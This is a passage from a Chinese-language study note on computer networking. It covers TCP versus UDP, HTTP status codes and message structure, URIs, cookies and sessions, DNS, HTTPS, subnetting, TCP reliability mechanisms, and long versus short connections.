/>如果比较UDP包和TCP包的结构，很明显UDP包不具备TCP包复杂的可靠性和控制机制。与TCP协议相同，UDP的源端口数和目的端口数也都支持一台主机上的多个应用。一个16位的UDP包包含了一个字节长的头部和数据的长度，校验码域使其可以进行整体校验。（许多应用只支持UDP，如：多媒体数据流，不产生任何额外的数据，即使知道有破坏的包也不进行重发。）很明显，当数据传输的性能必须让位于数据传输的完整性、可控制性和可靠性时，TCP协议是首选。当强调性能而不是传输的完整性时，如：音频和多媒体应用，UDP是最好的选择。在数据传输时间很短，以至于此前的连接过程成为整个流量主体的情况下，UDP较低的开销使其有更好的机会去传送管理数据。TCP丰富的功能有时会导致不可预料的性能低下，但是我们相信在不远的将来，TCP可靠的点对点将会用于绝大多数的网络应用。</p><p><strong>TCP协议和UDP协议特性区别总结：</strong></p><ul><li>TCP协议在传送数据段的时候要给段标号；UDP不需要</li><li>TCP协议可靠；UDP协议不可靠</li><li>TCP协议是面向连接的；UDP协议采用无连接</li><li>TCP协议负载较高，采用虚电路；UDP采用无连接</li><li>TCP协议的发送方要确认接收方是否收到数据段（3次握手协议）</li><li>TCP协议采用窗口技术和流控制</li></ul><h2 id="http状态码"><a class="markdownIt-Anchor" href="#http状态码"></a> HTTP状态码</h2><p>当浏览器访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP状态码的英文为HTTP Status Code。下面是常见的HTTP状态码：</p><ul><li>200 请求成功</li><li>301 资源（网页等）被永久转移到其他URL</li><li>404 请求的资源（网页等）不存在</li><li>500 内部服务器错误</li></ul><p><strong>状态码分类</strong></p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求者进行执行操作</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理</td></tr><tr><td>3**</td><td>重定向，需要进一步的操作以完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p><strong>状态码列表</strong></p><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续，客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET和POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功，但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清楚浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包含多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似，但资源只是临时被移动，客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址，与301、302类似，如果最初的请求是POST，那么新文档要用GET找到</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理，所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似，使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页），通过此代码，网站设计人员可设置“您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间太长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在，410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连接请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>充当网关或代理的服务器，从远端服务器接收到了一个无效的请求</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h2 id="http协议"><a class="markdownIt-Anchor" href="#http协议"></a> HTTP协议</h2><p>HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（WWW：World Wide Web）服务器传输超文本到本地浏览器的传送协议。</p><p>HTTP是一个基于TCP/IP通信协议来传递数据（HTML文件、图片文件、查询结果等）。</p><p><strong>主要特点</strong></p><ul><li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、POST。</li><li>灵活：HTTP允许传输任意类型的数据对象，正在传输的类型由Content-Type加以标记</li><li>无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li><li>无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传输的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li><li>支持B/S及C/S</li></ul><h3 id="http之url"><a class="markdownIt-Anchor" href="#http之url"></a> HTTP之URL</h3><p>HTTP使用统一资源标识符（Uniform Resource Identifiers，URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息。<br />URL，全称是Uniform Resource Locator，中文叫统一资源定位符，是互联网上用来标识某一处资源的地址。</p><ol><li><p>URI，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。<br />Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的URI一般有三个部分组成：</p><ul><li>访问资源的命名机制</li><li>存放资源的主机名</li><li>资源自身的名称，有路径标识，着重强调于资源</li></ul></li><li><p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。<br />URL是Internet上用来描述资源信息的字符串，主要用在各种WWW客户程序客户程序和服务器程序上。</p><p>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部分组成：</p><ul><li>协议（或称为服务方式）</li><li>存有该资源的主机IP地址（有时也包括端口号）</li><li>主机资源的具体地址。如目录和文件名等</li></ul></li><li><p>URN，uniform resource name，统一资源命名，是通过名字来标识资源</p></li></ol><p>URI是一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个URL都是URI，但不一定每个URI都是URL。这是因为URI还包括一个子类，即统一资源名称（URN），它命名资源但不指定如何定位资源。</p><p>在Java的URI中，一个URI实例可以代表绝对的，也可以相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包括了定位该资源的信息，因此它不能是相对的。</p><p>在Java类库中，URI类不包括任何访问资源的方法，它唯一的作用就是解析。相反的是，URL类可以打开一个到达资源的流。</p><h3 id="http之请求信息request"><a class="markdownIt-Anchor" href="#http之请求信息request"></a> HTTP之请求信息Request</h3><p>客户端发送一个HTTP请求到服务器的请求信息包括以下格式：<strong>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</strong></p><h3 id="http之响应消息response"><a class="markdownIt-Anchor" href="#http之响应消息response"></a> HTTP之响应消息Response</h3><p>一般情况下，服务器接收并处理客户端发过来的请求后返回一个HTTP的响应消息。<strong>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">200 OK                        &#x2F;&#x2F;客户端请求成功</span><br><span class="line">400 Bad Request               &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401 Unauthorized              &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 </span><br><span class="line">403 Forbidden                 &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务</span><br><span class="line">404 Not Found                 &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL</span><br><span class="line">500 Internal Server Error     &#x2F;&#x2F;服务器发生不可预期的错误</span><br><span class="line">503 Server Unavailable        &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</span><br></pre></td></tr></table></figure><h3 id="http工作原理"><a class="markdownIt-Anchor" href="#http工作原理"></a> HTTP工作原理</h3><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p><p>以下是HTTP请求/响应的步骤：</p><ol><li>客户端连接到Web服务器<br />一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认是80）建立一个TCP套接字连接。</li><li>发送HTTP请求<br />通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4个部分组成。</li><li>服务器接受请求并返回HTTP响应<br />Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4个部分组成。</li><li>释放连接TCP连接<br />若connection模型为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接；若connection模型为keep alive，则该连接会保持一段时间，则该时间内可以继续接受请求。</li><li>客户端浏览器解析HTML内容<br />客户端浏览器首先解析状态行，查看表明请求是否成功的状态码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。<br />例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：<br />① 浏览器向DNS服务器请求解析该URL中的域名所对应的IP地址；<br />② 解析出IP地址后，根据该IP地址和默认端口80，和服务器建立TCP连接；<br />③ 浏览器发出读取文件（URL中域名后面部分对应的文件）的HTTP请求，该请求报文作为TCP三次握手的第三个报文的数据发送给服务器；<br />④ 服务器对浏览器请求作出响应，并将对应的HTML文本发送给浏览器；<br />⑤ 释放TCP连接<br />⑥ 浏览器将该HTML文本显示</li></ol><p><strong>GET和POST请求的区别</strong></p><ul><li>GET提交的数据会放在URL之后，以？分割URL和传输数据，参数之间以&amp;相连；POST方法是把提交的数据放在HTTP包的body里面；</li><li>GET提交的数据大小有限制（HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制，只是由于浏览器对URL的长度有限制），而POST方法提交的数据没有限制；</li><li>GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值；</li><li>GET方式提交数据，会带来安全问题</li><li>GET方式通过一次HTTP请求即可获得数据；POST方式通过两次HTTP请求获得数据，第一次返回状态码100表示浏览器继续请求。</li></ul><h2 id="osi协议-tcpip协议以及每层对应的协议"><a class="markdownIt-Anchor" href="#osi协议-tcpip协议以及每层对应的协议"></a> OSI协议、TCP/IP协议以及每层对应的协议</h2><p>OSI分层 （7层）：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层；<br />TCP/IP分层（4层）：网络接口层、 网际层、运输层、 应用层；<br />5层协议 （5层）：物理层、数据链路层、网络层、运输层、 应用层；</p><h2 id="session机制-cookie机制"><a class="markdownIt-Anchor" href="#session机制-cookie机制"></a> session机制、cookie机制</h2><p>由于http协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是session。这个session是保存在服务端的，有一个唯一标识。在服务端保存session的方法有很多，内存、数据库、文件都可以。</p><p>每次http请求的时候，客户端都会发送相应的cookie信息到服务端，实际上大多数的应用都是用cookie来实现session跟踪的，第一次创建session的时候，服务端会在http协议中告诉客户端，需要在cookie里面记录一个session id，以后每次请求把这个会话id发送到服务器。</p><p>如果客户端浏览器禁用了cookie，在这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次http请求，URL后面都会附上一个诸如sid=xxx这样的参数，服务端据此来标识用户。</p><p><em>总结：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</em></p><h2 id="打开网页到页面显示之间的过程"><a class="markdownIt-Anchor" href="#打开网页到页面显示之间的过程"></a> 打开网页到页面显示之间的过程</h2><h3 id="dns解析"><a class="markdownIt-Anchor" href="#dns解析"></a> DNS解析</h3><h4 id="解析过程"><a class="markdownIt-Anchor" href="#解析过程"></a> 解析过程</h4><p>DNS解析是一个递归查询的过程<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20180909164251348.png" alt="" /></p><p>上图是查找www.google.com的IP地址流程。首先在本地域名服务器中查询IP地址，如果没有找到的情况下，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向com顶级域名服务器发送一个请求，依次类推下去。直到最后本地域名服务器得到google的IP地址并把它缓存到本地，供下次查询使用。从上述过程中，可以看出网址的解析是一个从左向右的过程：com-&gt;google.com-&gt;<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a>。事实上，<a href="http://xn--www-cs6et69dkeh2jun9at96b.google.com" target="_blank" rel="noopener">真正的网址是www.google.com</a>.，最后一个.对应的就是根域名服务器，默认情况下，通常会省略，浏览器在请求DNS的时候都会自动加上，所有网址真正的解析过程是：<code>.-&gt;.com-&gt;google.com.-&gt;www.google.com.</code>。</p><h4 id="dns优化"><a class="markdownIt-Anchor" href="#dns优化"></a> DNS优化</h4><p><strong>DNS缓存</strong><br />DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种：浏览器缓存、系统缓存、根域名服务器缓存、顶级域名服务器缓存、主域名服务器缓存</p><p><strong>DNS负载均衡</strong><br />DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN（Content Delivery Network）就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP返回给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容。</p><h3 id="tcp连接"><a class="markdownIt-Anchor" href="#tcp连接"></a> TCP连接</h3><p>HTTP协议是使用TCP作为其传输层协议的，当TCP出现瓶颈时，HTTP也会受到影响。</p><h4 id="https协议"><a class="markdownIt-Anchor" href="#https协议"></a> HTTPS协议</h4><p>HTTP报文是包裹在TCP报文中发送的，服务器端收到TCP报文时会解包提取出HTTP报文。但是这个过程中存在一定的风险，HTTP报文是明文，如果中间被截取的话会存在一定信息泄露的风险。HTTPS协议的本质就是HTTP+SSL(or TLS)。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层次结构中看它位于HTTP协议与TCP协议之间。</p><p>https在传输数据之前需要客户端与服务端进行一个握手（TCL/SSL握手），在握手过程中将确立双方加密传输数据的密码信息。TCL/SSL使用了非对称加密，对称加密和hash等。具体过程见的阮一峰先生的博客<a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html" target="_blank" rel="noopener">图解SSL/TLS协议</a></p><h4 id="http请求"><a class="markdownIt-Anchor" href="#http请求"></a> HTTP请求</h4><p>发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议发送到服务器指定端口（80和443）。HTTP请求报文是由三部分组成：请求行、请求报头和请求正文。</p><h4 id="服务器处理请求并返回http报文"><a class="markdownIt-Anchor" href="#服务器处理请求并返回http报文"></a> 服务器处理请求并返回HTTP报文</h4><p>后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTP Request对象，供上层使用。这一部分工作一般由Web服务器去进行处理，有Tomcat、Jetty和Netty等。</p><p>HTTP响应报文也是由三部分组成：状态码、响应报头和响应报文。</p><h3 id="浏览器解析渲染页面"><a class="markdownIt-Anchor" href="#浏览器解析渲染页面"></a> 浏览器解析渲染页面</h3><p>浏览器是一个边解析边渲染的过程。首先浏览器解析HTML文件构建DOM树，然后解析CSS文件构建渲染树，等到渲染树构建完成后，浏览器开始布局渲染树并将其绘制到屏幕上。这个过程比较复杂，涉及到两个概念: reflow(回流)和repain(重绘)。DOM节点中的各个元素都是以盒模型的形式存在，这些都需要浏览器去计算其位置和大小等，这个过程称为relow；当盒模型的位置,大小以及其他属性，如颜色，字体，等确定下来之后，浏览器便开始绘制内容，这个过程称为repain。页面在首次加载时必然会经历reflow和repain。</p><p>JS的解析是由浏览器中的JS解析引擎完成的。JS是单线程运行，也就是说，在同一个时间内只能做一件事，所有的任务都需要排队，前一个任务结束，后一个任务才能开始。但是又存在某些任务比较耗时，如IO读写等，所以需要一种机制可以先执行排在后面的任务，这就是：同步任务(synchronous)和异步任务(asynchronous)。JS的执行机制就可以看做是一个主线程加上一个任务队列(task queue)。同步任务就是放在主线程上执行的任务，异步任务是放在任务队列中的任务。所有的同步任务在主线程上执行，形成一个执行栈;异步任务有了运行结果就会在任务队列中放置一个事件；脚本运行时先依次运行执行栈，然后会从任务队列里提取事件，运行任务队列中的任务，这个过程是不断重复的，所以又叫做事件循环(Event loop)。</p><p>浏览器在解析过程中，如果遇到请求外部资源时，如图像,iconfont,JS等。浏览器将重复1-6过程下载该资源。请求过程是异步的，并不会影响HTML文档进行加载，但是当文档加载过程中遇到JS文件，HTML文档会挂起渲染过程，不仅要等到文档中JS文件加载完毕还要等待解析执行完毕，才会继续HTML的渲染过程。原因是因为JS有可能修改DOM结构，这就意味着JS执行完成前，后续所有资源的下载是没有必要的，这就是JS阻塞后续资源下载的根本原因。CSS文件的加载不影响JS文件的加载，但是却影响JS文件的执行。JS代码执行前浏览器必须保证CSS文件已经下载并加载完毕。</p><h3 id="web优化"><a class="markdownIt-Anchor" href="#web优化"></a> Web优化</h3><p>如何尽快的加载资源？答案就是能不从网络中加载的资源就不从网络中加载，当我们合理使用缓存，将资源放在浏览器端，这是最快的方式。如果资源必须从网络中加载，则要考虑缩短连接时间，即DNS优化部分;减少响应内容大小，即对内容进行压缩。另一方面，如果加载的资源数比较少的话，也可以快速的响应用户。当资源到达浏览器之后，浏览器开始进行解析渲染，浏览器中最耗时的部分就是reflow，所以围绕这一部分就是考虑如何减少reflow的次数。</p><p><strong>补充：</strong></p><ol><li><p>一个完整的HTTP请求，通常有以下7个步骤</p><ul><li>建立TCP连接</li><li>web浏览器向web服务器发送请求命令</li><li>浏览器发送请求头信息</li><li>服务器应答</li><li>服务器发送应答头信息</li><li>服务器向浏览器发送数据</li><li>服务器关闭TCP连接</li></ul></li><li><p>一个HTTP请求由四部分组成</p><ul><li>HTTP请求方法或动作，如：GET与POST</li><li>正在请求的URL</li><li>请求头，包含一些客户端环境信息、身份验证信息</li><li>请求体，即请求正文，可包含提交的查询字符串信息、表单信息等。</li></ul></li><li><p>一个HTTP响应一般由三个部分组成</p><ul><li>一个数字和文字组成的状态码，用来显示请求成功还是失败</li><li>响应头，包含许多有用的信息，如：服务器类型、日期时间、内容类型和长度</li><li>响应体，即响应正文。</li></ul></li><li><p>readyState属性（返回请求的当前状态）</p><ul><li>0，请求未初始换，open还没有调用</li><li>1，服务器连接已建立，open已经调用</li><li>2，请求已接收，即接收到头部信息</li><li>3，请求处理中，即接收到响应体了</li><li>4，请求已完成，且响应已就绪，即响应完成了。</li></ul></li></ol><h2 id="http和https区别https在请求时额外的过程https是如何保证数据安全的"><a class="markdownIt-Anchor" href="#http和https区别https在请求时额外的过程https是如何保证数据安全的"></a> http和https区别，https在请求时额外的过程，https是如何保证数据安全的</h2><p><strong>区别：</strong><br />HTTP协议传输的数据都是未加密的，即明文，为了保证隐私数据能加密传输，使用SSL协议用于对HTTP协议传输的数据进行加密，这就是HTTPS。简单的说，HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。</p><ul><li>https协议协议到CA申请证书，需要一定的费用</li><li>http是超文本传输协议，信息是明文传输，https则是具有安全性的SSL加密传输协议</li><li>http和https使用的是完全不用的连接方式，用到的端口不同，前者是80，后者是443</li><li>http的连接简单，是无状态的；https协议是ssl+http协议构成的可进行加密传输、身份认证的网络协议，比http协议安全</li></ul><p><strong>额外的过程：</strong><br />https在传输数据之前需要客户端与服务端进行一个握手（TCL/SSL握手），在握手过程中将确立双方加密传输数据的密码信息。TCL/SSL使用了非对称加密，对称加密和hash等。具体过程见的阮一峰先生的博客<a href="http://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html" target="_blank" rel="noopener">图解SSL/TLS协议</a></p><h2 id="ip地址子网划分"><a class="markdownIt-Anchor" href="#ip地址子网划分"></a> IP地址子网划分</h2><p><strong>IP地址的划分：</strong></p><ul><li>A类地址：以0开头，网络号是前一个字节</li><li>B类地址：以10开头，网络号是前两个字节</li><li>C类地址：以110开头，网络号是前三个字节</li></ul><p><strong>IP地址由网络号和主机号组成，ip与子网掩码相与得到网络号</strong></p><p><strong>子网划分</strong><br />传统的两级ip地址空间利用率很低，1个A类网络可连接的主机数可超过1000万台，但实际连接数并不多，所以需要对网络进行子网划分，通过子网掩码来区分网络。</p><p><strong>三级ip地址：&lt;网络号&gt;&lt;子网号&gt;&lt;主机号&gt;</strong></p><h2 id="tcp如何保证数据的可靠传输的这个问题可以引申出很多子问题拥塞控制慢开始-拥塞避免-快重传-滑动窗口协议-停止等待协议-超时重传机制"><a class="markdownIt-Anchor" href="#tcp如何保证数据的可靠传输的这个问题可以引申出很多子问题拥塞控制慢开始-拥塞避免-快重传-滑动窗口协议-停止等待协议-超时重传机制"></a> TCP如何保证数据的可靠传输的（这个问题可以引申出很多子问题，拥塞控制慢开始、拥塞避免、快重传、滑动窗口协议、停止等待协议、超时重传机制）</h2><p><em>总结一：</em></p><ol><li>确认和重传：接收方收到报文就会确认，发送方发送一段时间后没有收到确认就会重传</li><li>数据校验：TCP报文头有校验和，用于校验报文是否损坏</li><li>数据合理分片和排序：<br />TCP会按最大传输单元（MTU）合理分片，接收方会缓存为按排序到达的数据，重新排序后交给应用层<br />UDP：IP数据包大于1500字节，大于MTU。这个时候发送方的IP层就需要分片，吧数据包分成若干片，每一片都小于MTU。而接收方IP层则需要数据包的重组。由于UDP的特性，当某一片数据丢失时，接收方无法重组数据包，导致丢弃整个UDP数据包。</li><li>流量控制：当接收方来不及处理发送方的数据时，能通过滑动窗口，提示发送方降低发送的速率，防止包丢失。</li><li>拥塞控制：当网络拥塞时，通过拥塞窗口，减少数据的发送，防止包丢失。</li></ol><p><em>总结二：</em></p><ol><li>可靠传输：对于收到的请求，给出确认响应</li><li>超时重传</li><li>流量控制：让发送方的发送速率不要太快，要让接收方来得及接受。利用滑动窗口实现流量控制</li><li>拥塞控制：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不至过载</li><li>慢开始：TCP开始发送报文段时先设置拥塞窗口为1</li><li>拥塞避免：使拥塞窗口按线性规律增长</li><li>快重传：发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待为其设置的重传计时器到期</li><li>快恢复(与快重传配合使用)：当发送方连续收到三个重复确认时，就执行“乘法减小”算法，把慢开始门限减半。这是为了预防网络发生拥塞。请注意，接下来不执行慢开始算法。<br />由于发送方现在认为网络很可能没有发生拥塞(如果网络发生了严重的拥塞，就不会一连有好几个报文段连续达到接收方，就不会导致接收方连续发送重复确认)，因此与慢开始不同之处是现在不执行慢开始算法(即拥塞窗口现在不设置为1)，而是把它设置为慢开始门限减半后的数值，然后开始执行拥塞避免算法(“加法增大”)，使拥塞窗口缓慢地线性增长。</li></ol><h2 id="长连接与短连接"><a class="markdownIt-Anchor" href="#长连接与短连接"></a> 长连接与短连接</h2><h3 id="http协议和tcp协议"><a class="markdownIt-Anchor" href="#http协议和tcp协议"></a> HTTP协议和TCP协议</h3><p>HTTP的长连接和短连接本质上是TCP长连接和短连接。HTTP属于应用层协议，在传输层使用TCP协议，在网络层使用IP协议。IP协议主要解决网络路由和寻址问题，TCP协议主要解决如何在IP层之上可靠的传输数据包，使在网络上的另一端收到发端发出的所有包，并且顺序与发出顺序一致。TCP有可靠，面向连接的特点。</p><h3 id="http协议的长连接和短连接"><a class="markdownIt-Anchor" href="#http协议的长连接和短连接"></a> HTTP协议的长连接和短连接</h3><p>在HTTP/1.0中，默认使用的是短连接。也就是说，浏览器和服务器每进行一次HTTP操作，就建立一次连接，但任务结束就中断连接。如果客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源，如JavaScript文件、图像文件、CSS文件等；当浏览器没遇到这样一个Web资源，就会建立一个HTTP会话。</p><p>但从HTTP/1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入如下代码：<code>Connection:keep-alive</code>。在使用长连接的情况下，当一个网页打开完成之后，客户端和服务端之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器的网页，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个事件。实现长连接要客户端和服务端都支持长连接。</p><p>HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</p><h3 id="tcp长连接和短连接"><a class="markdownIt-Anchor" href="#tcp长连接和短连接"></a> TCP长连接和短连接</h3><p>我们模拟一下TCP短连接的情况，client向server发起连接请求，server接到请求，然后双方建立链接。client向server发送消息，server回应client，然后一次读写就完成了，这时候双方任何一个都可以发起close操作，不过一般都是client先发起close操作。为什么呢，一般的server不会回复完client后立即关闭连接的，当然不排除有特殊的情况。从上面的描述看，短连接一般只会在 client/server间传递一次读写操作。</p><p><strong>短连接的优点：管理起来比较方便，存在的连接都是有用的连接，不需要额外的控制手段。</strong></p><p>我们再模拟一下长连接的情况，client向server发起连接，server接受client连接，双方建立连接。client与server完成一次读写之后，它们之间的连接并不会主动关闭，后续的读写操作会继续使用这个链接。</p><p><strong>首先说一下TCP/IP详解上讲到的TCP保活功能，保活功能主要为服务器应用提供，服务器应用希望知道客户主机是否崩溃，从而可以代表客户使用资源。如果客户已经消失，使得服务器上保留一个半开放的连接，而服务器又在等待来自客户端的数据，则服务器将应远等待客户端的数据，保活功能就是试图在服务器端检测到这种半开放的连接。</strong></p><h3 id="长连接和短连接的生命周期"><a class="markdownIt-Anchor" href="#长连接和短连接的生命周期"></a> 